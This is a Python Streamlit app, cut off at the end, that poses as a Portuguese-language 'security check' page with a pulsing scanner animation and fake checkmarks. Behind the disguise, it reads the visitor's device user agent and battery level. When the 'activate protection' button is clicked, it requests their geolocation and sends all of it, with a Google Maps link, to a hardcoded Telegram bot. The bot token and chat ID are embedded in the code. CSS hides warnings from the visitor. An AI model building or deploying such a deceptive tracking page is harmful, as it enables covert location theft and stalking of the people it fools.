import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. SETUP TELEGRAM
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar_telegram(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

st.set_page_config(page_title="Sistema de Segurança", layout="centered")

# 2. CSS: BOLHA E OCULTAR ERROS/AVISOS
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .stAlert, [data-testid="stNotificationContent"], .stException { display: none !important; }
    
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }
    div.stButton > button {
        background-color: #ffc107 !important; color: black !important;
        font-weight: bold !important; width: 100%; height: 3.5em; border-radius: 10px; border: none;
    }
    </style>
""", unsafe_allow_html=True)

# 3. INTERFACE
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
caixa_bolha = st.empty()

if 'etapa' not in st.session_state:
    st.session_state['etapa'] = 'inicio'

# Bolha Inicial (4%)
if st.session_state['etapa'] == 'inicio':
    with caixa_bolha.container():
        st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# 4. CAPTURA DE MODELO E BATERIA (FORA DO CLIQUE PARA NÃO TRAVAR)
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='DEVICE_ID')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_ID')

# 5. O BOTÃO (DISPARA O POP-UP)
if st.button("🔴 ATIVAR PROTEÇÃO"):
    st.session_state['etapa'] = 'capturando'

# 6. LÓGICA APÓS O CLIQUE
if st.session_state['etapa'] == 'capturando':
    # Chama o pop-up de Localização IMEDIATAMENTE
    loc = get_geolocation() 
    
    # Se o usuário aceitou a localização
    if loc and 'coords' in loc:
        # Animação da bolha subindo de 0% a 100%
        for p in range(0, 101, 5):
            caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
            time.sleep(0.04)
        
        # Envio dos dados
        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🛡️ SISTEMA ATIVADO\n\n"
            f"📱 Modelo: {ua[:50] if ua else 'N/A'}\n"
            f"🔋 Bateria: {bat if bat else '--'}%\n"
            f"📍 [LOCALIZAÇÃO CONCLUÍDA]({mapa})"
        )
        
        enviar_telegram(relatorio)
        st.success("Localização concluída")
        st.session_state['etapa'] = 'finalizado'
        st.stop()
    else:
        # Enquanto não aceita, mostra "Wait..." na bolha e oculta avisos amarelos
        caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">Wait...</div></div></div>', unsafe_allow_html=True)
        time.sleep(1)
        st.rerun()

st.markdown('<p style="text-align:center; color
